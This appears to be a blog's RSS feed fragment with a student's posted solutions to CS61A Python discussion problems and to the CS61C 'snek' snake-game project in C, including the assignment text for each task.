    fizz&#13;
    buzz&#13;
    11&#13;
    fizz&#13;
    13&#13;
    14&#13;
    fizzbuzz&#13;
    16&#13;
    &gt;&gt;&gt; print(result)&#13;
    None&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
    i = 1&#13;
    while i &lt;= n:&#13;
        if i % 15 == 0:&#13;
            print('fizzbuzz')&#13;
        elif i % 3 == 0:&#13;
            print('fizz')&#13;
        elif i % 5 == 0:&#13;
            print('buzz')&#13;
        else:&#13;
            print(i)&#13;
        i += 1&#13;
&#13;
# Q3: Is Prime?&#13;
&#13;
&#13;
def is_prime(n):&#13;
    '''&#13;
    &gt;&gt;&gt; is_prime(10)&#13;
    False&#13;
    &gt;&gt;&gt; is_prime(7)&#13;
    True&#13;
    &gt;&gt;&gt; is_prime(1) # one is not a prime number!!&#13;
    False&#13;
    '''&#13;
    # prime number:  A positive integer that is divisible only by 1 and itself&#13;
    # 1. determine that n is 1 No&#13;
    # 2. iterate from 2 to n&#13;
    # 3. if n is divisible by i, False is returned&#13;
    # 4. else return True&#13;
    assert n &gt; 0, 'the n must be larger than 0'&#13;
    if n == 1:&#13;
        return False&#13;
    i = 2&#13;
    while i &lt;= sqrt(n):&#13;
        if n % i == 0:&#13;
            return False&#13;
        i += 1&#13;
    return True&#13;
&#13;
&#13;
# Q4: Unique Digits&#13;
# Write a function that returns the number of unique digits in a positive integer.&#13;
&#13;
def unique_digits(n):&#13;
    '''Return the number of unique digits in positive integer n.&#13;
&#13;
    &gt;&gt;&gt; unique_digits(8675309) # All are unique&#13;
    7&#13;
    &gt;&gt;&gt; unique_digits(13173131) # 1, 3, and 7&#13;
    3&#13;
    &gt;&gt;&gt; unique_digits(101) # 0 and 1&#13;
    2&#13;
    '''&#13;
    count, i = 0, 0&#13;
    while i &lt;= 9:&#13;
        if (has_digit(n, i)):&#13;
            count += 1&#13;
        i += 1&#13;
    return count&#13;
&#13;
&#13;
def has_digit(n, k):&#13;
    '''Returns whether k is a digit in n.&#13;
&#13;
    &gt;&gt;&gt; has_digit(10, 1)&#13;
    True&#13;
    &gt;&gt;&gt; has_digit(12, 7)&#13;
    False&#13;
    '''&#13;
    assert k &gt;= 0 and k &lt; 10&#13;
    while n &gt; 0:&#13;
        if n % 10 == k:&#13;
            return True &#13;
        n //= 10&#13;
    return False&#13;
&#13;
&#13;
# Q5: Ordered Digits&#13;
&#13;
def ordered_digits(x):&#13;
    '''Return True if the (base 10) digits of X&gt;0 are in non-decreasing&#13;
    order, and False otherwise.&#13;
&#13;
    &gt;&gt;&gt; ordered_digits(5)&#13;
    True&#13;
    &gt;&gt;&gt; ordered_digits(11)&#13;
    True&#13;
    &gt;&gt;&gt; ordered_digits(127)&#13;
    True&#13;
    &gt;&gt;&gt; ordered_digits(1357)&#13;
    True&#13;
    &gt;&gt;&gt; ordered_digits(21)&#13;
    False&#13;
    &gt;&gt;&gt; result = ordered_digits(1375) # Return, don't print&#13;
    &gt;&gt;&gt; result&#13;
    False&#13;
&#13;
    '''&#13;
    while x &gt;= 10:&#13;
        if (x % 10 &lt; x // 10 % 10):&#13;
            return False&#13;
        x //= 10&#13;
    return True&#13;
&#13;
```。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-disc01.html</guid><pubDate>Thu, 15 Aug 2024 10:07:33 +0000</pubDate></item><item><title>cs61c-su24-project1: snek</title><link>https://LianSeKong.github.io/lizi/post/cs61c-su24-project1-%20snek.html</link><description># Snake&#13;
&#13;
&gt; creating a playable snake game&#13;
&#13;
## Conceptual Overview&#13;
&#13;
### Snakes&#13;
&#13;
A snake game can be represented by a grid of characters. &#13;
&#13;
The grid contains walls, fruits, and one or more snakes. &#13;
&#13;
An example of a game is shown below:&#13;
&#13;
```javascript&#13;
##############&#13;
#            #&#13;
#    dv      #&#13;
#     v   #  #&#13;
#     v   #  #&#13;
#   s &gt;&gt;D #  #&#13;
#   v     #  #&#13;
# *A&lt;  *  #  #&#13;
#            #&#13;
##############&#13;
```&#13;
&#13;
The grid has the following special characters:&#13;
&#13;
*   `#` denotes a wall.&#13;
*   (space character) denotes an empty space.&#13;
*   `*` denotes a fruit.&#13;
*   `wasd` denotes the tail of a snake.&#13;
*   `^&lt;v&gt;` denotes the body of a snake.&#13;
*   `WASD` denotes the head of a snake.&#13;
*   `x` denotes the head of a snake that has died.&#13;
&#13;
Each character of the snake tells you what direction the snake is currently heading in:&#13;
&#13;
*   `w`, `W`, or `^` denotes up&#13;
*   `a`, `A`, or `&lt;` denotes left&#13;
*   `s`, `S`, or `v` denotes down&#13;
*   `d`, `D`, or `&gt;` denotes right&#13;
&#13;
At each time step, each snakes moves according to the following rules:&#13;
&#13;
*   Each snake moves one step in the direction of its head.&#13;
*   If the head crashes into the body of a snake or a wall, the snake dies and stops moving. When a snake dies, the head is replaced with an `x`.&#13;
*   If the head moves into a fruit, the snake eats the fruit and grows by 1 unit in length. Each time fruit is consumed, a new fruit is generated on the board.&#13;
&#13;
In the example above, after one time step, the board will look like this:&#13;
&#13;
```&#13;
##############&#13;
#         *  #&#13;
#     s      #&#13;
#     v   #  #&#13;
#     v   #  #&#13;
#   s &gt;&gt;&gt;D#  #&#13;
#   v     #  #&#13;
# A&lt;&lt;  *  #  #&#13;
#            #&#13;
##############&#13;
```&#13;
&#13;
After one more time step, the board will look like this:&#13;
&#13;
```&#13;
##############&#13;
#         *  #&#13;
#     s      #&#13;
#     v   #  #&#13;
#     v   #  #&#13;
#     &gt;&gt;&gt;x#  #&#13;
#   s     #  #&#13;
#A&lt;&lt;&lt;  *  #  #&#13;
#            #&#13;
##############&#13;
```&#13;
&#13;
Snakes are guaranteed to be at least three units long.&#13;
&#13;
### Numbering snakes&#13;
&#13;
Each snake on the board is numbered depending on the position of its tail, in the order that the tails appear in the file (going from top-to-bottom, then left-to-right). For example, consider the following board with four snakes:&#13;
&#13;
```&#13;
#############&#13;
#  s  d&gt;&gt;D  #&#13;
#  v   A&lt;a  #&#13;
#  S    W   #&#13;
#       ^   #&#13;
#       w   #&#13;
#############&#13;
```&#13;
&#13;
Snake 0 is the snake with tail `s`, snake 1 has tail `d`, snake 2 has tail `a`, and snake 3 has tail `w`.&#13;
&#13;
Once the snakes are numbered from their initial positions, the numbering of the snakes does not change throughout the game.&#13;
&#13;
### Game board&#13;
&#13;
A game board is a grid of characters, not necessarily rectangular. Here's an example of a non-rectangular board:&#13;
&#13;
```&#13;
##############&#13;
#            #######&#13;
#####             ##&#13;
#   #             ##&#13;
#####             ######&#13;
#                 ##   #&#13;
#                 ######&#13;
#                 ##&#13;
#                  #&#13;
#      #####       #&#13;
########   #########&#13;
```&#13;
&#13;
Note that each row can have a different number of characters, but will start and end with a wall (`#`). You can also assume that the board is an enclosed space, so snakes can't travel infinitely far in any direction.&#13;
&#13;
### The `game_state_t` struct&#13;
&#13;
A snake game is stored in memory in a `game_state_t` struct, which is defined in `state.h`. The struct contains the following fields:&#13;
&#13;
*   `unsigned int num_rows`: The number of rows in the game board.&#13;
*   `char** board`: The game board in memory. Each element of the `board` array is a `char*` pointer to a character array containing a row of the board. Each row must be terminated by a new line character and must be a valid string.&#13;
*   `unsigned int num_snakes`: The number of snakes on the board.&#13;
*   `snake_t* snakes`: An array of `snake_t` structs.&#13;
&#13;
### The `snake_t` struct&#13;
&#13;
Also defined in `state.h`, each `snake_t` struct contains the following fields:&#13;
&#13;
*   `unsigned int tail_row`: The row of the snake's tail.&#13;
*   `unsigned int tail_col`: The column of the snake's tail.&#13;
*   `unsigned int head_row`: The row of the snake's head.&#13;
*   `unsigned int head_col`: The column of the snake's head.&#13;
*   `bool live`: `true` if the snake is alive, and `false` if the snake is dead.&#13;
&#13;
Please don't modify the provided struct definitions. You should only need to modify `state.c` `snake.c`, and `custom_tests.c` in this project.&#13;
&#13;
## Task 1: `create_default_state`&#13;
&#13;
Implement the `create_default_state` function in `state.c`. This function should create a default snake game in memory with the following starting state (which you can hardcode), and return a pointer to the newly created `game_state_t` struct.&#13;
&#13;
```&#13;
####################&#13;
#                  #&#13;
# d&gt;D    *         #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
#                  #&#13;
####################&#13;
```&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;create_default_state&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t *&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the newly created &lt;code&gt;game_state_t&lt;/code&gt; struct.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
### Hints&#13;
&#13;
*   The board has 18 rows, and each row has 20 columns. The fruit is at row 2, column 9 (zero-indexed). The tail is at row 2, column 2, and the head is at row 2, column 4.&#13;
*   Which part of memory (code, static, stack, heap) should you store the new game in?&#13;
*   `strcpy` may be helpful.&#13;
&#13;
&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
/* Task 1 */&#13;
game_state_t *create_default_state() {&#13;
  unsigned int num_cols = 20;&#13;
  game_state_t *state = (game_state_t *)malloc(sizeof(game_state_t));&#13;
  state-&gt;num_rows = 18;&#13;
  state-&gt;num_snakes = 1;&#13;
&#13;
  // init board&#13;
  state-&gt;board = (char **)calloc(state-&gt;num_rows, sizeof(char *));&#13;
  for (size_t i = 0; i &lt; state-&gt;num_rows; i++) {&#13;
    state-&gt;board[i] = (char *)calloc(num_cols + 1, sizeof(char));&#13;
  }&#13;
  // begin an end row&#13;
  strcpy(state-&gt;board[0], '####################');&#13;
  strcpy(state-&gt;board[state-&gt;num_rows - 1], '####################');&#13;
  // main body&#13;
  for (unsigned int i = 1; i &lt; state-&gt;num_rows - 1; i++) {&#13;
    strcpy(state-&gt;board[i], '#                  #');&#13;
  }&#13;
&#13;
  // init snake&#13;
  state-&gt;snakes = (snake_t *)malloc(sizeof(snake_t) * state-&gt;num_snakes);&#13;
  state-&gt;snakes[0].tail_row = 2;&#13;
  state-&gt;snakes[0].tail_col = 2;&#13;
  state-&gt;snakes[0].head_row = 2;&#13;
  state-&gt;snakes[0].head_col = 4;&#13;
  state-&gt;snakes[0].live = true;&#13;
&#13;
  // init fruit  &#13;
  state-&gt;board[2][9] = '*';&#13;
&#13;
  // render board&#13;
  snake_t snake = state-&gt;snakes[0];&#13;
  state-&gt;board[2][2] = 'd';&#13;
  state-&gt;board[snake.tail_row][snake.tail_col] = 'd';&#13;
  state-&gt;board[snake.head_row][snake.head_col] = 'D';&#13;
  state-&gt;board[snake.head_row][snake.head_col - 1] = '&gt;';&#13;
  return state;&#13;
}&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## Task 2: `free_state`&#13;
&#13;
Implement the `free_state` function in `state.c`. This function should free all memory allocated for the given state, including all `snake` structs and all `state`-&gt;`board` contents.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;free_state&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be freed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
/* Task 2 */&#13;
void free_state(game_state_t *state)&#13;
{&#13;
  for (size_t i = 0; i &lt; state-&gt;num_rows; i++) {&#13;
    free(state-&gt;board[i]);&#13;
  }&#13;
  free(state-&gt;snakes);&#13;
  free(state-&gt;board);&#13;
  free(state);&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## Task 3: `print_board`&#13;
&#13;
Implement the `print_board` function in `state.c`. This function should print out the given game board to the given file pointer.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;print_board&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be printed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;FILE* fp&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the file object where the board should be printed to&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
### Hints&#13;
&#13;
*   The `fprintf` function will help you print out characters and/or strings to a given file pointer.&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
void print_board(game_state_t *state, FILE *fp)&#13;
{&#13;
  for (size_t i = 0; i &lt; state-&gt;num_rows; i++) {&#13;
    fprintf(fp, '%s\n', state-&gt;board[i]);&#13;
  }&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
## Task 4: `update_state`&#13;
&#13;
Implement the `update_state` function in `state.c`. This function should move the snakes one timestep according to the rules of the game.&#13;
&#13;
Helper functions are not graded; for this task, we'll only be checking that `update_state` is correct.&#13;
&#13;
### Task 4.1: Helpers&#13;
&#13;
We have provided the following helper function definitions that you can implement. These functions are entirely independent of any game board or snake; they only take in a single character and output some information about that character.&#13;
&#13;
*   `bool is_tail(char c)`: Returns true if `c` is part of the snake's tail. The snake's tail consists of these characters: `wasd`. Returns false otherwise.&#13;
*   `bool is_head(char c)`: Returns true if `c` is part of the snake's head. The snake's head consists of these characters: `WASDx`. Returns false otherwise.&#13;
*   `bool is_snake(char c)`: Returns true if `c` is part of the snake. The snake consists of these characters: `wasd^&lt;v&gt;WASDx`. Returns false otherwise.&#13;
*   `char body_to_tail(char c)`: Converts a character in the snake's body (`^&lt;v&gt;`) to the matching character representing the snake's tail (`wasd`). The output may be undefined for characters that are not a snake's body.&#13;
*   `char head_to_body(char c)`: Converts a character in the snake's head (`WASD`) to the matching character representing the snake's body (`^&lt;v&gt;`). The output may be undefined for characters that are not a snake's head.&#13;
*   `unsigned int get_next_row(unsigned int cur_row, char c)`: Returns `cur_row + 1` if `c` is `v` or `s` or `S`. Returns `cur_row - 1` if `c` is `^` or `w` or `W`. Returns `cur_row` otherwise.&#13;
*   `unsigned int get_next_col(unsigned int cur_col, char c)`: Returns `cur_col + 1` if `c` is `&gt;` or `d` or `D`. Returns `cur_col - 1` if `c` is `&lt;` or `a` or `A`. Returns `cur_col` otherwise.&#13;
&#13;
Unit tests are not provided for these helper functions, so you'll have to write your own tests in `custom_tests.c` to make sure that these are working as expected. Make sure that these tests comprehensively test your helper functions--our autograder will run your tests on buggy implementations to make sure that your tests can catch bugs!&#13;
&#13;
When writing a unit test, the test function should return `false` if the test fails, and `true` if the test passes. You can use `printf` to print out debugging statements. Some of the assert helper functions in `asserts.h` might be useful.&#13;
&#13;
Once you've written your own unit tests, you can run them with `make run-custom-tests` and `make debug-custom-tests`.&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
static bool is_tail(char c) {&#13;
  return c == 'w' || c == 'a' || c == 's' || c == 'd';&#13;
}&#13;
static bool is_head(char c) {&#13;
  return c == 'W' || c == 'A' || c == 'S' || c == 'D' || c == 'x';&#13;
}&#13;
static bool is_snake(char c) {&#13;
  return is_tail(c) || is_head(c) || c == 'v' || c == '^' || c == '&lt;' || c == '&gt;';&#13;
}&#13;
static char body_to_tail(char ch) {&#13;
  switch (ch) {&#13;
      case '^':&#13;
          ch = 'w';&#13;
          break;&#13;
      case 'v':&#13;
          ch = 's';&#13;
          break;&#13;
      case '&gt;':&#13;
          ch = 'd';&#13;
          break;&#13;
      case '&lt;':&#13;
          ch = 'a';&#13;
          break;&#13;
      default:&#13;
          ch = '?';&#13;
          break;&#13;
  }&#13;
  return ch;&#13;
}&#13;
static char head_to_body(char c) {&#13;
  char cb;&#13;
  switch (c) {&#13;
      case 'W':&#13;
        cb = '^';&#13;
        break;&#13;
      case 'S':&#13;
        cb = 'v';&#13;
        break;&#13;
      case 'A':&#13;
        cb = '&lt;';&#13;
        break;&#13;
      case 'D':&#13;
        cb = '&gt;';&#13;
        break;&#13;
      default:&#13;
        cb = '?';&#13;
  }&#13;
  return cb;&#13;
}&#13;
&#13;
static unsigned int get_next_row(unsigned int cur_row, char c) {&#13;
  if (c == 'v' || c == 's' || c == 'S') {&#13;
    cur_row += 1;&#13;
  }&#13;
  else if (c == '^' || c == 'w' || c == 'W') {&#13;
    cur_row -= 1;&#13;
  }&#13;
  return cur_row;&#13;
}&#13;
&#13;
static unsigned int get_next_col(unsigned int cur_col, char c) {&#13;
  if (c == '&gt;' || c == 'd' || c == 'D') {&#13;
    cur_col += 1;&#13;
  }&#13;
  else if (c == '&lt;' || c == 'a' || c == 'A') {&#13;
    cur_col -= 1;&#13;
  }&#13;
  return cur_col;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 4.2: `next_square`&#13;
&#13;
Implement the `next_square` helper function in `state.c`. This function returns the character in the cell the given snake is moving into. This function should not modify anything in the game stored in memory.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;next_square&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be analyzed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;int snum&lt;/code&gt;&lt;/td&gt;&lt;td&gt;The index of the snake to be analyzed&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;char&lt;/code&gt;&lt;/td&gt;&lt;td&gt;The character in the cell the given snake is moving into&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
As an example, consider the following board:&#13;
&#13;
```&#13;
##############&#13;
#            #&#13;
#            #&#13;
#            #&#13;
#   d&gt;D*     #&#13;
#            #&#13;
#       s    #&#13;
#       v    #&#13;
#       S    #&#13;
##############&#13;
```&#13;
&#13;
Assuming that `state` is a pointer to this game state, then `next_square(state, 0)` should return `*`, because the head of snake 0 is moving into a cell with `*` in it. Similarly, `next_square(state, 1)` should return `#` for snake 1.&#13;
&#13;
The helper functions you wrote earlier might be helpful for this function (and the rest of this task too). Also, check out `get_board_at` and `set_board_at`, which are helper functions we wrote for you.&#13;
&#13;
Use `make run-unit-tests` and `make debug-unit-tests` to run the provided unit tests. You can also use `p print_board(state, stdout)` to print out your entire board while debugging in `cgdb`.&#13;
&#13;
&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
static char next_square(game_state_t *state, unsigned int snum) {&#13;
  snake_t snake = state-&gt;snakes[snum];&#13;
  char head_char = state-&gt;board[snake.head_row][snake.head_col];&#13;
  unsigned int next_col = get_next_col(snake.head_col, head_char);&#13;
  unsigned int next_row = get_next_row(snake.head_row, head_char);&#13;
  return get_board_at(state, next_row, next_col);&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 4.3: `update_head`&#13;
&#13;
Implement the `update_head` function in `state.c`. This function will update the head of the snake.&#13;
&#13;
Remember that you will need to update the head both on the game board and in the `snake_t` struct. On the game board, add a character where the snake is moving. In the `snake_t` struct, update the row and column of the head.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;update_head&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be updated&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;int snum&lt;/code&gt;&lt;/td&gt;&lt;td&gt;The index of the snake to be updated&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
As an example, consider the following board:&#13;
&#13;
```&#13;
##############&#13;
#   d&gt;D      #&#13;
#        *   #&#13;
#        W   #&#13;
#        ^   #&#13;
#        ^   #&#13;
#        w   #&#13;
#            #&#13;
#            #&#13;
##############&#13;
&#13;
&#13;
```&#13;
&#13;
Assuming that `state` is a pointer to this game state, then `update_head(state, 0)` will move the head of snake 0, leaving all other snakes unchanged. In the `snake_t` struct corresponding to snake 0, the `head_col` value should be updated from 6 to 7, and the `head_row` value should stay unchanged at 1. The new board will look like this:&#13;
&#13;
```&#13;
##############&#13;
#   d&gt;&gt;D     #&#13;
#        *   #&#13;
#        W   #&#13;
#        ^   #&#13;
#        ^   #&#13;
#        w   #&#13;
#            #&#13;
#            #&#13;
##############&#13;
&#13;
&#13;
```&#13;
&#13;
Note that this function ignores food, walls, and snake bodies when moving the head.&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
static void update_head(game_state_t *state, unsigned int snum) {&#13;
  snake_t *snake = (state-&gt;snakes) + snum;&#13;
  unsigned int cur_row = snake-&gt;head_row;&#13;
  unsigned int cur_col = snake-&gt;head_col;&#13;
  char cur_char = state-&gt;board[cur_row][cur_col];&#13;
  unsigned int next_row = get_next_row(cur_row, cur_char);&#13;
  unsigned int next_col = get_next_col(cur_col, cur_char);&#13;
  set_board_at(state, next_row, next_col, cur_char);&#13;
  set_board_at(state, cur_row, cur_col, head_to_body(cur_char));&#13;
  snake-&gt;head_row = next_row;&#13;
  snake-&gt;head_col = next_col;&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 4.4: `update_tail`&#13;
&#13;
Implement the `update_tail` function in `state.c`. This function will update the tail of the snake.&#13;
&#13;
Remember that you will need to update the tail both on the game board and in the `snake_t` struct. On the game board, blank out the current tail, and change the new tail from a body character (`^&lt;v&gt;`) into a tail character (`wasd`). In the `snake_t` struct, update the row and column of the tail.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;update_tail&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be updated&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;int snum&lt;/code&gt;&lt;/td&gt;&lt;td&gt;The index of the snake to be updated&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
As an example, consider the following board:&#13;
&#13;
```&#13;
##############&#13;
#   d&gt;D      #&#13;
#        *   #&#13;
#        W   #&#13;
#        ^   #&#13;
#        ^   #&#13;
#        w   #&#13;
#            #&#13;
#            #&#13;
##############&#13;
```&#13;
&#13;
Assuming that `state` is a pointer to this game state, then `update_tail(state, 1)` will move the tail of snake 1, leaving all other snakes unchanged. In the `snake_t` struct corresponding to snake 1, the `tail_row` value should be updated from 6 to 5, and the `tail_col` value should stay unchanged at 9. The new board will look like this:&#13;
&#13;
```&#13;
##############&#13;
#   d&gt;D      #&#13;
#        *   #&#13;
#        W   #&#13;
#        ^   #&#13;
#        w   #&#13;
#            #&#13;
#            #&#13;
#            #&#13;
##############&#13;
```&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
static void update_tail(game_state_t *state, unsigned int snum) {&#13;
  snake_t *snake_ptr = &amp;state-&gt;snakes[snum];&#13;
  char tail_char = state-&gt;board[snake_ptr-&gt;tail_row][snake_ptr-&gt;tail_col];&#13;
  unsigned int next_row = get_next_row(snake_ptr-&gt;tail_row, tail_char);&#13;
  unsigned int next_col = get_next_col(snake_ptr-&gt;tail_col, tail_char);&#13;
  set_board_at(state, snake_ptr-&gt;tail_row, snake_ptr-&gt;tail_col, ' ');&#13;
  set_board_at(state, next_row, next_col, body_to_tail(state-&gt;board[next_row][next_col]));&#13;
  snake_ptr-&gt;tail_row = next_row;&#13;
  snake_ptr-&gt;tail_col = next_col;&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
### Task 4.5: `update_state`&#13;
&#13;
Using the helpers you created, implement `update_state` in `state.c`.&#13;
&#13;
As a reminder, the rules for moving a snake are as follows:&#13;
&#13;
*   Each snake moves one step in the direction of its head.&#13;
*   If the head crashes into the body of a snake or a wall, the snake dies and stops moving. When a snake dies, the head is replaced with an `x`.&#13;
*   If the head moves into a fruit, the snake eats the fruit and grows by 1 unit in length. (You can implement growing by 1 unit by updating the head without updating the tail.) Each time fruit is consumed, a new fruit is generated on the board.&#13;
&#13;
The `int (*add_food)(game_state_t* state)` argument is a function pointer, which means that `add_food` is a pointer to the code section of memory. The code that `add_food` is pointing at is a function that takes in `game_state_t* state` as an argument and returns an `int`. You can call this function with `add_food(x)`, replacing `x` with your argument, to add a fruit to the board.&#13;
&#13;
&lt;table&gt;&lt;colgroup&gt;&lt;col span='1'&gt; &lt;col span='1'&gt; &lt;col span='1'&gt; &lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td colspan='3'&gt;&lt;code&gt;update_state&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan='2'&gt;&lt;b&gt;Arguments&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;game_state_t* state&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to the &lt;code&gt;game_state_t&lt;/code&gt; struct to be updated&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;int (*add_food)(game_state_t* state)&lt;/code&gt;&lt;/td&gt;&lt;td&gt;A pointer to a function that will add fruit to the board&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Return values&lt;/b&gt;&lt;/td&gt;&lt;td colspan='2'&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#13;
&#13;
## Solution&#13;
&#13;
```c&#13;
void update_state(game_state_t *state, int (*add_food)(game_state_t *state))&#13;
{&#13;
  for (unsigned int i = 0; i &lt; state-&gt;num_snakes; i++)&#13;
  {&#13;
    snake_t *snake_ptr = state-&gt;snakes + i;&#13;
    char head_char = get_board_at(state, snake_ptr-&gt;head_row, snake_ptr-&gt;head_col);&#13;
    unsigned int next_row = get_next_row(snake_ptr-&gt;head_row, head_char);&#13;
    unsigned int next_col = get_next_col(snake_ptr-&gt;head_col, head_char);&#13;
    char next_char = get_board_at(state, next_row, next_col);&#13;
    if (is_snake(next_char) || next_char == '#') {&#13;
      snake_ptr-&gt;live = false;&#13;
      set_board_at(state, snake_ptr-&gt;head_row, snake_ptr-&gt;head_col, 'x');&#13;
    } else if (next_char == '*') {&#13;
      update_head(state, i);&#13;
      add_food(state);&#13;
    } else {&#13;
      update_head(state, i);&#13;
      update_tail(state, i);&#13;
    }&#13;
  }&#13;
  return;&#13;
}&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
